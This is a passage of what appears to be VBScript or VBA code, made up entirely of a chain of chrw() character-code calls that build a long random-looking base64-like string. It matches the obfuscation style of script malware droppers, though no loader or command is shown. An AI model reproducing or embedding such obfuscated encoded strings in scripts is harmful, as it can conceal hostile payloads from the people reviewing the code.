hrw(114)&chrw(108)&chrw(88)&chrw(99)&chrw(66)&chrw(88)&chrw(81)&chrw(73)&chrw(89)&chrw(80)&chrw(50)&chrw(49)&chrw(122)&chrw(65)&chrw(54)&chrw(101)&chrw(72)&chrw(50)&chrw(55)&chrw(120)&chrw(118)&chrw(120)&chrw(100)&chrw(108)&chrw(49)&chrw(75)&chrw(106)&chrw(115)&chrw(77)&chrw(69)&chrw(55)&chrw(76)&chrw(102)&chrw(116)&chrw(55)&chrw(70)&chrw(53)&chrw(67)&chrw(113)&chrw(71)&chrw(88)&chrw(77)&chrw(103)&chrw(121)&chrw(113)&chrw(51)&chrw(88)&chrw(90)&chrw(114)&chrw(86)&chrw(57)&chrw(120)&chrw(83)&chrw(117)&chrw(48)&chrw(50)&chrw(122)&chrw(102)&chrw(120)&chrw(72)&chrw(115)&chrw(114)&chrw(78)&chrw(57)&chrw(78)&chrw(119)&chrw(119)&chrw(72)&chrw(83)&chrw(87)&chrw(117)&chrw(65)&chrw(111)&chrw(107)&chrw(83)&chrw(82)&chrw(54)&chrw(111)&chrw(69)&chrw(122)&chrw(117)&chrw(106)&chrw(85)&chrw(81)&chrw(115)&chrw(65)&chrw(75)&chrw(115)&chrw(116)&chrw(115)&chrw(70)&chrw(56)&chrw(75)&chrw(110)&chrw(80)&chrw(70)&chrw(75)&chrw(105)&chrw(114)&chrw(83)&chrw(105)&chrw(106)&chrw(111)&chrw(100)&chrw(97)&chrw(98)&chrw(66)&chrw(88)&chrw(108)&chrw(89)&chrw(72)&chrw(100)&chrw(73)&chrw(86)&chrw(74)&chrw(106)&chrw(56)&chrw(89)&chrw(104)&chrw(80)&chrw(79)&chrw(80)&chrw(76)&chrw(106)&chrw(121)&chrw(106)&chrw(104)&chrw(83)&chrw(85)&chrw(89)&chrw(50)&chrw(72)&chrw(80)&chrw(71)&chrw(48)&chrw(72)&chrw(53)&chrw(103)&chrw(113)&chrw(88)&chrw(121)&chrw(120)&chrw(72)&chrw(114)&chrw(88)&chrw(87)&chrw(74)&chrw(110)&chrw(77)&chrw(55)&chrw(116)&chrw(82)&chrw(111)&chrw(102)&chrw(54)&chrw(118)&chrw(71)&chrw(79)&chrw(120)&chrw(65)&chrw(83)&chrw(48)&chrw(72)&chrw(55)&chrw(68)&chrw(105)&chrw(77)&chrw(71)&chrw(104)&chrw(72)&chrw(78)&chrw(113)&chrw(75)&chrw(80)&chrw(57)&chrw(106)&chrw(78)&chrw(56)&chrw(112)&chrw(97)&chrw(71)&chrw(88)&chrw(108)&chrw(85)&chrw(51)&chrw(121)&chrw(68)&chrw(82)&chrw(71)&chrw(55)&chrw(49)&chrw(72)&chrw(77)&chrw(115)&chrw(57)&chrw(121)&chrw(121)&chrw(79)&chrw(56)&chrw(104)&chrw(115)&chrw(55)&chrw(98)&chrw(71)&chrw(65)&chrw(72)&chrw(77)&chrw(88)&chrw(66)&chrw(109)&chrw(50)&chrw(113)&chrw(102)&chrw(78)&chrw(73)&chrw(117)&chrw(50)&chrw(85)&chrw(87)&chrw(67)&chrw(109)&chrw(120)&chrw(90)&chrw(71)&chrw(84)&chrw(53)&chrw(89)&chrw(86)&chrw(103)&chrw(55)&chrw(98)&chrw(120)&chrw(116)&chrw(79)&chrw(102)&chrw(110)&chrw(57)&chrw(98)&chrw(78)&chrw(57)&chrw(114)&chrw(57)&chrw(116)&chrw(54)&chrw(117)&chrw(116)&chrw(54)&chrw(77)&chrw(76)&chrw(82)&chrw(113)&chrw(99)&chrw(117)&chrw(104)&chrw(77)&chrw(105)&chrw(97)&chrw(120)&chrw(116)&chrw(117)&chrw(117)&chrw(121)&chrw(122)&chrw(48)&chrw(72)&chrw(111)&chrw(113)&chrw(72)&chrw(120)&chrw(48)&chrw(50)&chrw(52)&chrw(70)&chrw(53)&chrw(51)&chrw(116)&chrw(70)&chrw(73)&chrw(117)&chrw(65)&chrw(73)&chrw(117)&chrw(90)&chrw(86)&chrw(69)&chrw(75)&chrw(85)&chrw(70)&chrw(111)&chrw(120)&chrw(82)&chrw(88)&chrw(77)&chrw(52)&chrw(121)&chrw(103)&chrw(106)&chrw(57)&chrw(100)&chrw(50)&chrw(97)&chrw(51)&chrw(56)&chrw(52)&chrw(81)&chrw(122)&chrw(71)&chrw(57)&chrw(112)&chrw(89)&chrw(107)&chrw(111)&chrw(80)&chrw(120)&chrw(67)&chrw(117)&chrw(111)&chrw(100)&chrw(57)&chrw(118)&chrw(82)&chrw(99)&chrw(52)&chrw(52)&chrw(50)&chrw(112)&chrw(121)&chrw(119)&chrw(86)&chrw(88)&chrw(49)&chrw(115)&chrw(55)&chrw(53)&chrw(100)&chrw(122)&chrw(77)&chrw(72)&chrw(51)&chrw(118)&chrw(70)&chrw(115)&chrw(90)&chrw(70)&chrw(88)&chrw(78)&chrw(72)&chrw(115)&chrw(71)&chrw(56)&chrw(55)&chrw(53)&chrw(53)&chrw(87)&chrw(90)&chrw(102)&chrw(122)&chrw(109)&chrw(118)&chrw(83)&chrw(88)&chrw(81)&chrw(114)&chrw(54)&chrw(108)&chrw(77)&chrw(67)&chrw(87)&chrw(76)&chrw(80)&chrw(55)&chrw(80)&chrw(120)&chrw(112)&chrw(88)&chrw(110)&chrw(68)&chrw(105)&chrw(109)&chrw(100)&chrw(117)&chrw(115)&chrw(69)&chrw(106)&chrw(110)&chrw(85)&chrw(85)&chrw(105)&chrw(103)&chrw(57)&chrw(85)&chrw(50)&chrw(102)&chrw(103)&chrw(55)&chrw(89)&chrw(106)&chrw(85)&chrw(78)&chrw(77)&chrw(79)&chrw(68)&chrw(67)&chrw(112)&chrw(89)&chrw(50)&chrw(100)&chrw(77)&chrw(97)&chrw(66)&chrw(105)&chrw(51)&chrw(72)&chrw(49)&chrw(112)&chrw(90)&chrw(100)&chrw(55)&chrw(120)&chrw(80)&chrw(90)&chrw(88)&chrw(76)&chrw(66)&chrw(110)&chrw(86)&chrw(109)&chrw(112)&chrw(56)&chrw(113)&chrw(108)&chrw(88)&chrw(100)&chrw(110)&chrw(90)&chrw(74)&chrw(86)&chrw(107)&chrw(105)&chrw(107)&chrw(50)&chrw(107)&chrw(68)&chrw(71)&chrw(112)&chrw(75)&chrw(67)&chrw(79)&chrw(72)&chrw(122)&chrw(67)&chrw(73)&chrw(53)&chrw(104)&chrw(48)&chrw(117)&chrw(115)&chrw(100)&chrw(80)&chrw(77)&chrw(73)&chrw(106)&chrw(74)&chrw(90)&chrw(52)&chrw(114)&chrw(99)&chrw(82)&chrw(68)&chrw(115)&chrw(85)&chrw(90)&chrw(112)&chrw(119)&chrw(113)&chrw(81)&chrw(56)&chrw(76)&chrw(89)&chrw(116)&chrw(81)&chrw(69)&chrw(118)&chrw(108)&chrw(100)&chrw(113)&chrw(86)&chrw(100)&chrw(110)&chrw(107)&chrw(111)&chrw(98)&chrw(65)&chrw(89)&chrw(102)&chrw(108)&chrw(56)&chrw(88)&chrw(88)&chrw(102)&chrw(74)&chrw(114)&chrw(68)&chrw(122)&chrw(49)&chrw(86)&chrw(53)&chrw(66)&chrw(108)&chrw(70)&chrw(103)&chrw(50)&chrw(118)&chrw(54)&chrw(68)&chrw(82)&chrw(111)&chrw(111)&chrw(56)&chrw(117)&chrw(67)&chrw(89)&chrw(48)&chrw(55)&chrw(80)&chrw(113)&chrw(53)&chrw(86)&chrw(68)&chrw(57)&chrw(89)&chrw(97)&chrw(68)&chrw(54)&chrw(73)&chrw(108)&chrw(114)&chrw(49)&chrw(69)&chrw(99)&chrw(80)&chrw(111)&chrw(84)&chrw(88)&chrw(74)&chrw(110)&chrw(101)&chrw(113)&chrw(55)&chrw(101)&chrw(111)&chrw(99)&chrw(78)&chrw(79)&chrw(119)&chrw(103)&chrw(110)&chrw(98)&chrw(114)&chrw(72)&chrw(114)&chrw(100)&chrw(66)&chrw(88)&chrw(108)&chrw(107)&chrw(82)&chrw(88)&chrw(103)&chrw(48)&chrw(69)&chrw(54)&chrw(115)&chrw(112)&chrw(71)&chrw(53)&chrw(108)&chrw(84)&chrw(110)&chrw(49)&chrw(79)&chrw(53)&chrw(57)&chrw(49)&chrw(56)&chrw(103)&chrw(70)&chrw(107)&chrw(80)&chrw(66)&chrw(49)&chrw(111)&chrw(56)&chrw(98)&chrw(55)&chrw(74)&chrw(79)&chrw(72)&chrw(75)&chrw(66)&chrw(51)&chrw(70)&chrw(82)&chrw(120)&chrw(116)&chrw(117)&chrw(100)&chrw(111)&chrw(56)&chrw(54)&chrw(122)&chrw(70)&chrw(114)&chrw(77)&chrw(75)&chrw(112)&chrw(106)&chrw(106)&chrw(48)&chrw(80)&chrw(99)&chrw(114)&chrw(89)&chrw(51)&chrw(112)&chrw(116)&chrw(52)&chrw(83)&chrw(76)&chrw(110)&chrw(78)&chrw(52)&chrw(50)&chrw(97)&chrw(48)&chrw(80)&chrw(66)&chrw(73)&chrw(108)&chrw(68)&chrw(104)&chrw(84)&chrw(78)&chrw(52)&chrw(106)&chrw(87)&chrw(113)&chrw(90)&chrw(90)&chrw(66)&chrw(97)&chrw(82)&chrw(119)&chrw(111)&chrw(99)&chrw(103)&chrw(120)&chrw(55)&chrw(82)&chrw(105)&chrw(82)&chrw(112)&chrw(89)&chrw(69)&chrw(66)&chrw(121)&chrw(55)&chrw(77)&chrw(122)&chrw(103)&chrw(69)&chrw(79)&chrw(100)&chrw(68)&chrw(83)&chrw(121)&chrw(54)&chrw(71)&chrw(52)&chrw(73)&chrw(111)&chrw(116)&chrw(67)&chrw(56)&chrw(105)&chrw(51)&chrw(72)&chrw(78)&chrw(49)&chrw(87)&chrw(98)&chrw(50)&chrw(120)&chrw(55)&chrw(104)&chrw(120)&chrw(117)&chrw(112)&chrw(66)&chrw(107)&chrw(99)&chrw(57)&chrw(87)&chrw(118)&chrw(83)&chrw(67)&chrw(105)&chrw(73)&chrw(101)&chrw(82)&chrw(75)&chrw(56))
